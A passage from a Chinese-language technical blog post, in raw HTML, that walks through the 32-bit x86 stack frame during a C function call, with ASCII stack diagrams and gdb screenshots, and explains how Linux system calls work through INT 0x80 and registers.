<span class="keyword">int</span> c = add(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成 32 位程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc add.c -o add -m32</span><br></pre></td></tr></table></figure><p>查看汇编代码（汇编代码可以用 gdb、objdump、IDA 等工具查看，也可以直接用 gcc 编译成汇编代码）。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029100353.png" alt="20201029100353"></p><p>输入 <code>layout asm</code> 查看汇编代码：</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029100438.png" alt="20201029100438"></p><p>进入 main() 函数后，先保存上一个栈帧的 <code>EBP</code>（main 函数不是第一个被调用的函数）。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029100601.png" alt="20201029100601"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                </span><br><span class="line">    high address      </span><br><span class="line">                +--------------------+ &lt;--+ </span><br><span class="line">                |                    |    | </span><br><span class="line">                |       ......       |    | previous frame</span><br><span class="line">                |                    |    |</span><br><span class="line">                +--------------------+ &lt;--+ </span><br><span class="line">ESP,EBP ------&gt; |    previous EBP    |    | main()&#39;s frame</span><br><span class="line">                +--------------------+ &lt;--+</span><br><span class="line">    low address</span><br></pre></td></tr></table></figure><p>然后保存寄存器。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029100700.png" alt="20201029100700"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    | main()&#39;s frame</span><br><span class="line">ESP ------&gt; |  saved registers   |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>开辟一定的空间保存局部变量。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029100959.png" alt="20201029100959"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |  saved registers   |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    | main()&#39;s frame</span><br><span class="line">            |        b&#x3D;2         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        a&#x3D;1         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">ESP ------&gt; |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>压入 add() 函数的参数。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101023.png" alt="20201029101023"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |  saved registers   |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        b&#x3D;2         |    | main()&#39;s frame</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        a&#x3D;1         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         2          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">ESP ------&gt; |         1          |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>call add() 函数，先保存下一条指令的地址，然后跳转到 add() 函数。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101150.png" alt="20201029101150"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |  saved registers   |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        b&#x3D;2         |    |</span><br><span class="line">            +--------------------+    | main()&#39;s frame</span><br><span class="line">            |        a&#x3D;1         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         2          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         1          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">ESP ------&gt; |       0x122b       |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>进入 add() 函数，先保存 main() 函数的 <code>EBP</code>。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101222.png" alt="20201029101222"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">                </span><br><span class="line">    high address      </span><br><span class="line">                +--------------------+ &lt;--+ </span><br><span class="line">                |                    |    | </span><br><span class="line">                |       ......       |    | previous frame</span><br><span class="line">                |                    |    |</span><br><span class="line">                +--------------------+ &lt;--+ </span><br><span class="line">                |    previous EBP    |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |  saved registers   |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |       ......       |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |        b&#x3D;2         |    |</span><br><span class="line">                +--------------------+    | main()&#39;s frame</span><br><span class="line">                |        a&#x3D;1         |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |         2          |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |         1          |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |       0x122b       |    |</span><br><span class="line">                +--------------------+ &lt;--+</span><br><span class="line">ESP,EBP ------&gt; |    previous EBP    |    | add()&#39;s frame</span><br><span class="line">                +--------------------+ &lt;--+</span><br><span class="line">    low address</span><br></pre></td></tr></table></figure><p>开辟空间用以保存局部变量。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101315.png" alt="20201029101315"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |   saved registers  |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        b&#x3D;2         |    |</span><br><span class="line">            +--------------------+    | main()&#39;s frame</span><br><span class="line">            |        a&#x3D;1         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         2          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         1          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       0x122b       |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    | add()&#39;s frame</span><br><span class="line">            +--------------------+    |</span><br><span class="line">ESP ------&gt; |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>通过 <code>EBP</code> 加上偏移获取 add() 函数的两个参数，然后求和，结果保存在 <code>EAX</code> 寄存器（<code>EAX</code> 是累加寄存器）。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101353.png" alt="20201029101353"></p><p>累加结果放入局部变量 c。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101417.png" alt="20201029101417"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |   saved registers  |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        b&#x3D;2         |    |</span><br><span class="line">            +--------------------+    | main()&#39;s frame</span><br><span class="line">            |        a&#x3D;1         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         2          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         1          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       0x122b       |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        c&#x3D;3         |    |</span><br><span class="line">            +--------------------+    | add()&#39;s frame</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">ESP ------&gt; |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>将 c 的值放入 <code>EAX</code> 寄存器作为返回值。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101503.png" alt="20201029101503"></p><p>然后 add() 函数返回，先执行 <code>LEAVE</code> 指令，恢复 main() 函数的 <code>EBP</code>。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101534.png" alt="20201029101534"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV ESP, EBP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">                </span><br><span class="line">    high address      </span><br><span class="line">                +--------------------+ &lt;--+ </span><br><span class="line">                |                    |    | </span><br><span class="line">                |       ......       |    | previous frame</span><br><span class="line">                |                    |    |</span><br><span class="line">                +--------------------+ &lt;--+ </span><br><span class="line">                |    previous EBP    |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |  saved registers   |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |       ......       |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |        b&#x3D;2         |    |</span><br><span class="line">                +--------------------+    | main()&#39;s frame</span><br><span class="line">                |        a&#x3D;1         |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |         2          |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |         1          |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |       0x122b       |    |</span><br><span class="line">                +--------------------+ &lt;--+</span><br><span class="line">ESP,EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |        c&#x3D;3         |    |</span><br><span class="line">                +--------------------+    | add()&#39;s frame</span><br><span class="line">                |       ......       |    |</span><br><span class="line">                +--------------------+    |</span><br><span class="line">                |                    |    |</span><br><span class="line">                +--------------------+ &lt;--+</span><br><span class="line">    low address</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP EBP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |  saved registers   |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        b&#x3D;2         |    |</span><br><span class="line">            +--------------------+    | main()&#39;s frame</span><br><span class="line">            |        a&#x3D;1         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         2          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         1          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">ESP ------&gt; |       0x122b       |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">            |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        c&#x3D;3         |    |</span><br><span class="line">            +--------------------+    | add()&#39;s frame</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>然后执行 <code>RET</code> 指令，将返回地址赋给 <code>EIP</code>，从 add() 函数返回至 main() 函数，<code>EIP</code> 的值为 <code>0x122b</code>，即下一条指令为 main() 函数的 <code>ADD ESP, 0x8</code></p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101613.png" alt="20201029101613"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |  saved registers   |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        b&#x3D;2         |    | main()&#39;s frame</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        a&#x3D;1         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |         2          |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">ESP ------&gt; |         1          |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>执行 <code>ADD ESP, 0x8</code>，清除 add() 函数的两个参数。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029101641.png" alt="20201029101641"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">            </span><br><span class="line">high address      </span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">            |                    |    | </span><br><span class="line">            |       ......       |    | previous frame</span><br><span class="line">            |                    |    |</span><br><span class="line">            +--------------------+ &lt;--+ </span><br><span class="line">EBP ------&gt; |    previous EBP    |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |   saved registers  |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |       ......       |    | main()&#39;s frame</span><br><span class="line">            +--------------------+    |</span><br><span class="line">            |        b&#x3D;2         |    |</span><br><span class="line">            +--------------------+    |</span><br><span class="line">ESP ------&gt; |        a&#x3D;1         |    |</span><br><span class="line">            +--------------------+ &lt;--+</span><br><span class="line">low address</span><br></pre></td></tr></table></figure><p>至此 add() 函数的调用完成，可以在 main() 函数继续执行之后的指令了。</p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>应用程序无法调用内核函数，需要通过<strong>系统调用</strong>陷入到内核态，由操作系统执行。</p><p>系统调用通过 <code>INT 0x80</code> 中断实现，不同的系统调用有不同的系统调用号，系统调用号需放在 <code>EAX</code> 寄存器中。</p><p>系统调用号在 /usr/include/asm/unistd.h 中定义。</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029132816.png" alt="20201029132816"></p><p>查看 i386 体系结构下的系统调用号：</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201029133124.png" alt="20201029133124"></p><p>陷入到内核态前需要保护现场，将寄存器、程序计数器压入<strong>内核栈</strong>，然后调用相应的内核函数（系统调用）。内核函数执行完成后，将返回值放入 <code>EAX</code> 寄存器，然后恢复现场，将寄存器、程序计数器从<strong>内核栈</strong>恢复，<br>然后恢复到用户态。保护现场和恢复现场均由中断处理程序完成。</p><p>系统调用参数传递与函数调用参数传递略有不同，当系统调用参数不超过 6 个时，参数从左到右放到寄存器 <code>EBX</code>，<code>ECX</code>，<code>EDX</code>，<code>ESI</code>，<code>EDI</code> ，<code>EBP</code> 中，如果参数超过 6 个，所有参数应该放在一块连续的内存区域里（C 结构体），用寄存器 <code>EBX</code> 保存指向该内存区域的指针。</p><p>应用程序一般通过 API 去完成系统调用。API 与 系统调用 不同，一个 API 可能调用多个系统调用，不同的 API 也可能调用同一个系统调用。</p><p>基本的流程可以概括为：</p><ul><li>应用程序调用 API</li><li>API 将系统调用号存入 <code>EAX</code>，然后通过中断调用系统调用</li><li>中断处理程序保存寄存器至内核栈，陷入内核态，根据系统调用号调用对应的内核函数</li><li>内核函数完成工作，保存返回值至 <code>EAX</code></li><li>中断处理程序从内核栈恢复寄存器，恢复到用户态，返回到 API</li><li>API 将 <code>EAX</code> 返回给应用程序</li></ul><p>系统调用的跟踪可用 strace 工具。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1U7411z7Ki" target="_blank" rel="noopener">CTF Linux pwn快速入门 - 哔哩哔哩</a></p><p><a href="https://mooc.study.163.com/course/1000029000?tid=2403023011&amp;_trace_c_p_k2_=a5ca10da464e4706ba97d6b676a259e8#/info" target="_blank" rel="noopener">Linux 内核分析 - 网易云课堂</a></p><p><a href="https://book.douban.com/subject/19973015//" target="_blank" rel="noopener">《Operating Systems: Three Easy Pieces》</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;进程内存布局&quot;&gt;&lt;a href=&quot;#进程内存布局&quot; class=&quot;headerlink&quot; title=&quot;进程内存布局&quot;&gt;&lt;/a&gt;进程内存布局&lt;/h2&gt;&lt;p&gt;32 位保护模式下 Linux 中进程的内存布局如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0xFFFFFFFF  ------&amp;gt; +----------------------+ &amp;lt;--+ &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |                      |    | &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |       OS Kernel      |    | 1GB&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |                      |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0xC0000000  ------&amp;gt; +----------------------+ &amp;lt;--+ &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                |   |                      |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                |   |         stack        |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                v   |                      |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    +----------------------+    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |                      |    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    +----------------------+    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    | Memory Mapping Region|    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x40000000  ------&amp;gt; +----------------------+    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    |                      |    